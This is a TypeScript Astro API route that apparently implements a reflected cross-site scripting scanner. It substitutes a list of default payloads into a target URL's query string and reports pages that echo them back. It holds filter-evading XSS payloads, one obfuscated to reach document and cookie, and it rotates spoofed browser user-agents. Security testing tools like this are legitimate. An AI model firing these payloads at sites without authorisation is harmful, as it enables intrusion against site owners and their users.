import type { APIRoute } from "astro";

const defaultPayloads = [
  '"><A HRef=" AutoFocus OnFocus=top/**/?. >',
  '"><A HRef=" AutoFocus OnFocus=top/**/?.[\'ale\' + \'rt\'](document + cookie)>',
  '%27"><Img Src=OnXSS OnError=alert(1)>',
  '<script>alert(1)</script>',
];

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
];

const DEFAULT_DELAY = 1000;

interface Vulnerability {
  type: string;
  description: string;
  severity: "high";
  payload: string;
  testUrl: string;
}

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const createUrl = (baseUrl: string, payload: string) => {
  try {
    const urlObj = new URL(baseUrl);
    const queryParams = urlObj.searchParams;
    const firstParam = queryParams.keys().next().value;
    if (firstParam) {
      queryParams.set(firstParam, payload);
    } else {
      urlObj.searchParams.append("payload", payload);
    }
    return urlObj.toString();
  } catch {
    return `${baseUrl}?payload=${encodeURIComponent(payload)}`;
  }
};

const checkVulnerability = async (baseUrl: string, payload: string): Promise<Vulnerability | null> => {
  try {
    const testUrl = createUrl(baseUrl, payload);
    const response = await fetch(testUrl, {
      headers: { "User-Agent": getRandomUserAgent() },
    });
    const content = await response.text();
    if (content.toLowerCase().includes(payload.toLowerCase())) {
      return {
        type: "Reflected XSS",
        description: "Payload was reflected in the response",
        severity: "high",
        payload,
        testUrl,
      };
    }
    return null;
  } catch (error) {
    console.error(`Error checking URL ${baseUrl}: ${error}`);
    return null;
  }
};

export const POST: APIRoute = async ({ request }) => {
    const body = await request.json();
    const { url, urls = [], payloads = [] } = body;
  
    const urlsToScan = url ? [url] : urls;
    if (!urlsToScan || urlsToScan.length === 0 || !urlsToScan.every((u: string) => typeof u === "string")) {
      return new Response(JSON.stringify({ error: "At least one URL is required" }), {
        status: 400,
        headers: { "Content-Type": "application/json" },
      });
    }
  
    const payloadsToUse = payloads.length > 0 ? payloads : defaultPayloads;
    if (!payloadsToUse || payloadsToUse.length === 0 || !payloadsToUse.every((p: string) => typeof p === "string")) {
      return new Response(JSON.stringify({ error: "At least one payload is required" }), {
        status: 400,
        headers: { "Content-Type": "application/json" },
      });
    }
  
    try {
      const vulnerabilities: Vulnerability[] = [];
      const totalUrls = urlsToScan.length;
      let scannedUrls = 0;
  
      for (const scanUrl of urlsToScan) {
        for (const payload of payloadsToUse) {
          const result = await checkVulnerability(scanUrl, payload);
          if (result) {
            vulnerabilities.push(result);
          }
          await delay(DEFAULT_DELAY);
        }
        scannedUrls++;
        const progress = Math.round((scannedUrls / totalUrls) * 100);
 
        console.log(`Progress: ${progress}%`);
      }
  
      const results = {
        url: urlsToScan.join(", "),
        vulnerabilities,
        scanTime: new Date().toLocaleString(),
      };
  
      return new Response(JSON.stringify(results), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    } catch (error) {
      return new Response(JSON.stringify({ error: "Internal server error" }), {
        status: 500,
        headers: { "Content-Type": "application/json" },
      });
    }
  };